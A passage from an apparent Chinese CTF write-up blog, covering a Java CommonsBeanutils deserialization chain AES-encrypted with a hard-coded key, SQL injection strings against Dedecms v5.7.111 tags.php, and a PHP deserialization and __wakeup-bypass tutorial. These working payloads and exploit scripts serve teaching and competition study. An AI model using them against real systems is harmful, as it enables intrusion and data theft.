class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.实例化BeanComparator，其中comparator的部分就用我们找到的替换类</span></span><br><span class="line"><span class="comment">//            BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.实例化优先队列PriorityQueue，如下因为我们上面comparator是String类型，所以在add的时候要用String类型的字符串。</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.反射将property 的值设置成恶意的outputProperties ，将队列里的两个1替换成恶意的TemplateImpl 对象</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.序列化到文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终将生成的<code>test.bin</code>用<code>AES</code>加密并base64编码，即可得到长度为<code>2860</code>的payload。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># test.bin为编译好的序列化链的内容</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;test.bin&quot;</span>)</span><br><span class="line">    exp = aes_enc(data)</span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(exp))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b&#x27;kMNtUyJ+QnWeGtM6c7FSoZISa+WpmVjE5nsJyZS+6RyiYV3loy3inr5kavKuAjAAig4YDfNxHne9FIhbcXmwg7M1jiBzNoDOSdbTXdab3blpkN4U7DLGPWwZs5HonBDTqzmOSqbOeXZ696WNYSTovEVzS+WTai+/v6hYXAOFkuwLdda+K508E4ATzbuFVc+5BGS6+YF36aMBrQO95ShRG6UEnrAVh6NJJZiR+68cyUBFb0qloxZ+mxKeTzkIl5TtR0ojRTZIO2CqyzXyNANkb2gQka4x+sUUnXwNgWtu0I+o4aSDxwQofnRxWh8rkMEdUdOAD9JISYyBztM9cbVWtluLqaciEo6jmZDD3A8rXvPWcypq4XGUWq8jgUTZKx2oD1ugtUZJv7nvp0vgHLMw2XRG3q3MSycvuhMjLlyaXvmXSs67isYBadHt9MlFVrw5uml8EuhA/Nr33etTkruIkdoQcwAoNq60sWf37q64HFxpFOFm17XHrynd819qkOmoI2GGiqBsGzYr2kgO0LU2plJ/uSPcRtybtITtEUYFdv51UUYONZq3OkKsFko82MTx9ajJSMMnL53FAm0xlcsfa4a8gemUxEYf3DlWZE1ArHLCTY6UKtEGkhXbfSXdXUk8jcIDYuaU4amS1KGdMV45PMVaPDXi3djI70EIpKuGG0g9pPdSCcKbKXqaBxGy++1DK2Llc4EDghM0R2pyZn4F4E8U8r7CJBBzHV7VcVqbEdaO0NX4kdcbezlPXHcNyZYGGp0EXNyw1nileo873nW8/wKJhzWvRsdUq8N2EZFk3QsjFUiFsxjsArOLtHp4keLrtXsaFxWL96Jujz3FZXN3idnP2doXdAxB5FpenQrZdIxLb93PEXV8rrxZ+8jLDId4svnoWpc4usUnDbq8rFi90xfZrxU4kwiiNPrj7xrNOFLx690SnM0Fc9JsbCK5CS701Aw2WlVJ4037H00cDtdfVsbijVlYBaBNiXmI6m6jDYHdnytjU2Zv8gbP9mQm7MhgVyPphnRpb2zxRq+zXUerMwxAzMobVRsFandQkdbgTQxBNxhpcZgJopbyPU69qX8Zb4hX2M5FT4kHIghWJkX/EPJzGVo3Yaq/y6jyHVLBFWXPDK+2dx5AiB3AxUUnVvsJ1awafq65WSG/D1px9PoZvSyvQkb1PeuyQSrMhn95gmgHIK24aHVVxJ5v25L6vquYGFZGWgEjFmp/L3I65zTMleFvNiJqPu7E2U/3z2kJcsir7KtOd/23IkMQbDRPVndhOhNZTn8YasqsDsomRR56sSvDgle7hA4X3/jr1KQLlP1gjRLoa/i1A6UYNxXLMlTUMSLpEF5CUXZxhBYvg9BsRiqk2SlxAeqGzGNQtwktJ+A8iJvIwfAPusllyzCXJph3zw3ufraRydV6zP2INavM28KfyWdf17det/D6BUVADQDjD9YPCONa2FGrhM/dHY8CHS2jFejPoyh6paeZyUcfXKYI28GvGH1rB/fW+n7tNvtzs10nGvbnNUrBd1Ia6bF8oh4vwblShvWqq7rW9ycOFXs2Zepvbh3kh8bkynavLxRyQN68lunTOMkkcmCBR97q3Ax+7PUKhr/9NjNcAzdJgphNPIeZogoUXdQ73Eo2cu6ebocjIPh2bls04hr+goN3ThIAXyRSgqNVVe2Nki3w42Aky8lIA44GOvmlfuG97nzhmkhJLBWNupY7EAqNcz4IijS5JaT7EW6rEiQX8A5SOdvodyL5rQgG2iot/20pHLvm8kP77wW/G+fd5Pvn6Lu9Axee6xFHHjaNwWvb1kL+KWzCKXLPhdlli8kUdBzaqiZ08XRuYR0PRg9h6DHOeYXs2MIBPCZtF70k+/1Tf/x2ldb+PoZ5LpiaKF+3KtH0qebbkKR4JVMnL60HNEPmR0RS4HQVQlBwv1Euz1GF4byuztKi7pGajqw4NGrrcGGoqmvAa1OLALgAQa7Xp97su32tZS3B4ojyPz+vgoftqZjI3iq4jC6XJZFeOoDo02ab0nGhQOxtuVjTxfrs+35NcTcWeYX8YpVjBA4TMkTj1qrhWFcuGNzio9om2fKzNfRI66UkRiNPY6mfujj65vZg2yFOQOwLD4fF+ZQTQ9HDSIIhM9r9HXEw0Nt3QLIChOBD7IkufMV9wGrgwFexGbe86Mmn3wSegTJ/Eq0uWY59IvMBis+jnm7nxoiBnGwE4y/WYTLsFZH/53x81IHehMSsNg2MNJ0tpfm6hukUX3e6KHl+qszHrQBYJqg9Rz/U9j/v+BH84NKtsyXVKVDFQQJvNoUfx6N71k8T58i8oD/v1dweLqBImAIJqSSd5q2/rEIElM/mKtjLFYfTnIGpOIIKvRnTMvbfwvIap7XOHyNsk5xFSerhO/oTcDPxazIOaq/PY8k9dfRFH4h+Bwhqy5C0OuYR2Ca76jLWS7vwW3dKYwL+kJXX7miITZ5Z3sEcFM3Mjf1t4gOvdly/7CslQbzUSLvzWgoKZqESofNqWPMOJZf/w73LFUf9+l9LFVr60D1xjVIuob41nqzNznUaPD02CwPX8IhvJVZjhMFaSJht3Jd2VDqXQD9a/xcrWVXcKBsy7OVXgmbWBn6mV1/0pgh+laMJR/qvtYnBuwGGfV9ETITLbXNzdKCxVxejapKDV6Pm/KgYxg6c9X1KguUkj+ICCun0Pn+P506dAtcg7vtPFu92WPahcfXLw36EjD0kWW3mpye+NI7+x++eDOZ5qYBQQNsqBqJ/cuaAkE1pM04nxyA+bN9VAsQx0RQj35IflWGV1l8Jol1DfCAcPyDY/vaD4mmkGJ7TjQOJ8WRP1QWp1Ca3m0AtDZMchw46z3Xsk4j3VLg=&#x27;</span></span><br><span class="line"><span class="comment"># 2860</span></span><br></pre></td></tr></table></figure><p>发送过去</p><p><img src="/./RealWorld/w_3_1.png"></p><p>在dnslog得到base64编码后的flag，解码即可得到flag</p><p><img src="/./RealWorld/w_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;Sh0rT3r_Byt3c0d3_m4K3_L1f3_E4s13r&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="YourSqlTrick"><a href="#YourSqlTrick" class="headerlink" title="YourSqlTrick"></a>YourSqlTrick</h2><p>Dedecms v5.7.111前台tags.php SQL注入漏洞</p><p>参考链接: <a href="https://github.com/wy876/POC/blob/main/Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md">Dedecms v5.7.111前台tags.php SQL注入漏洞</a></p><p>抓包，可以在回显位2那里看到回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tag=a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),123,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_1.png"></p><p><strong>库名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,database(),3,4,5,6,7,8,9,10,11--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dedecmsv57utf8sp2</span><br></pre></td></tr></table></figure><p><strong>表名</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dede_downloads,dede_advancedsearch,dede_myadtype,dede_member_type,dede_uploads,dede_member_tj,dede_mytag,dede_admin,dede_admintype,dede_member_model,dede_area,dede_addonarticle,dede_addoninfos,dede_flinktype,dede_member_person,dede_purview,dede_member_snsmsg,dede_shops_products,dede_member_space,dede_member_group,dede_freelist,dede_addonspec,dede_softconfig,dede_arccache,dede_plus_seoinfo,dede_co_onepage,dede_sys_set,dede_vote_member,dede_member_operation,flag,dede_myad,dede_tagindex,dede_member_feed,dede_addonshop,dede_sys_enum,dede_sysconfig,dede_archives_log_list,dede_dl_log,dede_member_friends,dede_flink,dede_erradd,dede_sys_module,dede_homepageset,dede_member_vhistory,dede_shops_userinfo,dede_feedback,dede_taglist,dede_payment,dede_channeltype,dede_co_urls,dede_co_note,dede_moneycard_record,dede_search_cache,dede_member_pms,dede_member_company,dede_shops_delivery,dede_addonsoft,dede_diyforms,dede_stepselect,dede_co_htmls,dede_member_guestbook,dede_archives_log_detail,dede_addonimages,dede_scores,dede_arctiny,dede_archives,dede_member_flink,dede_member_msg,dede_sys_task,dede_sgpage,dede_pwd_tmp,dede_keywords,dede_moneycard_type,dede_member_stowtype,dede_arcatt,dede_shops_orders,dede_search_keywords,dede_arctype,dede_verifies,dede_log,dede_plus,dede_multiserv_config,dede_arcmulti,dede_member_stow,dede_member,dede_ratings,dede_vote,dede_arcrank,dede_co_mediaurls,dede_mtypes</span><br></pre></td></tr></table></figure><p>有一个<code>flag</code>的表，接下来注<code>flag</code>表</p><p><strong>列名</strong></p><p>跑出<code>flag</code>表的列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=&#x27;flag&#x27;--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_value</span><br></pre></td></tr></table></figure><p><strong>数据</strong></p><p>注出<code>flag</code>表中的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,concat(flag_value),3,4,5,6,7,8,9,10,11%20from%20flag--%20\\</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;70adbbd8-b9da-11ee-9b1e-00163e01b905&#125;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="一些常用的知识"><a href="#一些常用的知识" class="headerlink" title="一些常用的知识"></a>一些常用的知识</h1><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">private变量会被序列化为：/x00类名/x00变量名</span><br><span class="line">protected变量会被序列化为: /x00/*/x00变量名 </span><br><span class="line">public变量会被序列化为：变量名</span><br><span class="line">在PHP中，类不区分大小写</span><br><span class="line"></span><br><span class="line">__sleep()    //在对象被序列化之前运行  *</span><br><span class="line"></span><br><span class="line">__wakeup()   //将在反序列化之后立即调用  *</span><br><span class="line">如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。此特性自 PHP 7.4.0 起可用。</span><br><span class="line">__construct() //当对象被创建时，会触发进行初始化</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__toString()： //当一个对象被当作字符串使用时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //获得一个类的成员变量时调用,用于从不可访问的属性读取数据（不可访问的属性包括：1.属性是私有型。2.类中不存在的成员变量）</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="如何找反序列化链"><a href="#如何找反序列化链" class="headerlink" title="如何找反序列化链"></a>如何找反序列化链</h1><p>一般来说，我们都是要通过反序列的链子实现某些操作，比如rce、文件包含、文件写入等等。可以通过从结果（目的、想到实现的操作）开始一直往前推，比较容易找到一条可用的链子。</p><p>简单样例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析：</p><ol><li><p>最终利用的是<code>shen::__toString()</code>来rce，所以我们下一步是找能触发它的地方。</p></li><li><p>在<code>big::__call()</code>的<code>preg_match</code>能触发<code>__toString</code>方法，可以理解为正则匹配是字符串操作，所以可以触发，因此我们用这个来触发<code>shen::__toString()</code>。（注：把一个对象当作字符串处理可以触发<code>__toString</code>方法）</p></li><li><p><code>ctf::__destruct()</code>能触发<code>__call</code>，因此用它来触发<code>big::__call()</code>。（注：调用对象调用不存在的方法时触发<code>__call</code>方法）</p></li><li><p><code>__destruct</code>方法是在对象被销毁时触发，因此只要反序列化代码运行结束就能触发该方法。</p></li><li><p>接下来是变量赋值的细节，首先<code>__call</code>的触发是用的是<code>ctf</code>类的<code>h1</code>变量，<code>h2</code>变量会传递到<code>__call</code>方法的<code>$args</code>变量，因此<code>h1</code>是 <code>new big()</code>，<code>h2</code>是<code>new shen()</code>；<code>shen</code>类的<code>cmd</code>变量是能执行命令的，因此里面是放想要执行的命令。</p></li><li><p>最终的链子是：<code>ctf::__destruct =&gt; big::__call =&gt; shen::__toString </code>。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">big</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">shen</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h1 = <span class="keyword">new</span> <span class="title function_ invoke__">big</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">new</span> <span class="title function_ invoke__">shen</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;O:3:&quot;big&quot;:0:&#123;&#125;s:2:&quot;h2&quot;;O:4:&quot;shen&quot;:1:&#123;s:3:&quot;cmd&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="wakeup-绕过总结"><a href="#wakeup-绕过总结" class="headerlink" title="wakeup()绕过总结"></a>wakeup()绕过总结</h1><h2 id="cve-2016-7124"><a href="#cve-2016-7124" class="headerlink" title="cve-2016-7124"></a>cve-2016-7124</h2><p>影响范围：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><p>正常来说在反序列化过程中，会先调用 <code>__wakeup()</code> 方法再进行 <code>unserilize</code> 的操作，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，<code>__wakeup()</code>的执行会被跳过。</p><p>样例（php 5.5.9）：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正常反序列化：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:2:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_1.png"></p><p>很明显是先触发了<code>wakeup</code>再触发<code>destruct</code>。</p><p>若将<code>&quot;ctf&quot;:2</code>的<code>2</code>改成<code>3</code>，使得对象属性个数变大，则会使<code>wakeup</code>不触发。</p><p>对象属性个数不匹配：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?ctf=O:3:&quot;ctf&quot;:3:&#123;s:2:&quot;h1&quot;;N;s:2:&quot;h2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_1_2.png" alt="wakeup_1_2"></p><h2 id="php引用赋值"><a href="#php引用赋值" class="headerlink" title="php引用赋值 &amp;"></a>php引用赋值 &amp;</h2><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p><p>举例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改$b的值也会修改$a的值</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;new test&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a = &#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b = &#x27;</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wakeup_2_1.png"></p><p>这个方法是用来绕过一些特定的判断。</p><p>样例（PHP 7.1.9）:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key=False;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;wakeup)||!<span class="variable language_">$this</span>-&gt;wakeup)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You get it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span 